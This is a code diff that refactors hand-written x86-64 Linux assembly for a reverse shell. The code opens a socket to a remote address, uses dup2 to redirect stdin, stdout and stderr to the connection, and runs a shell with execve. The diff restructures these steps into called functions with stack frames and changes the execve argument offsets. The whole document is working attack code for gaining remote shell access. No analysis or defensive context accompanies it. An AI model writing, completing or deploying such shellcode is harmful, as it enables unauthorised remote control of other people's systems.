@@ -15,8 +15,14 @@ global _start
 
 _start:
 	call _start.open_socket
+	call _start.redirect
+	call _start.open_shell
+	call _start.end
 
 _start.open_socket: ;opens the socket and specifies the port and ip address to call
+
+	push rbp
+        mov rbp, rsp
 
 	mov rax, 41	;moves number of socket syscall to rax	
 	mov rdi, 2 	;AF_INET
@@ -43,9 +49,14 @@ _start.open_socket: ;opens the socket and specifies the port and ip address to c
 	cmp rax, -1 	;any return value below 0 is an error
         je _start.badend	;cleanly exits if there is an error
 	
-	call _start.redirect
-	
+	;call _start.redirect
+	leave
+	ret
+
 _start.redirect: ;redirects stdin, stdout, and stderr to the socket connection
+	
+	push rbp
+        mov rbp, rsp
 	
 	;stdin redirect
 	mov rax, 33     	;syscall of the dup2
@@ -71,17 +82,24 @@ _start.redirect: ;redirects stdin, stdout, and stderr to the socket connection
         cmp rax, -1      	;a return value of -1 is an error
         je _start.badend       	;cleanly exits if there is an error
 	
-	call _start.open_shell
+	;call _start.open_shell
+	leave
+	ret
 
 _start.open_shell: ;opens a shell for the remote to run
 	
+	push rbp
+        mov rbp, rsp
+
 	mov rax, 59		;syscall of execve
         mov rdi, filename	;shell
-        lea rsi, [rsp+48]	;name of the file
-        lea rdx, [rsp+64]	;name of environmental variables
+        lea rsi, [rsp+24]	;name of the file
+        lea rdx, [rsp+40]	;name of environmental variables
         syscall			;executes the system call
 	
-	call _start.end	
+	;call _start.end
+	leave
+	ret	
 
 _start.end: ;for if the program can exit cleanly (no errors)
 
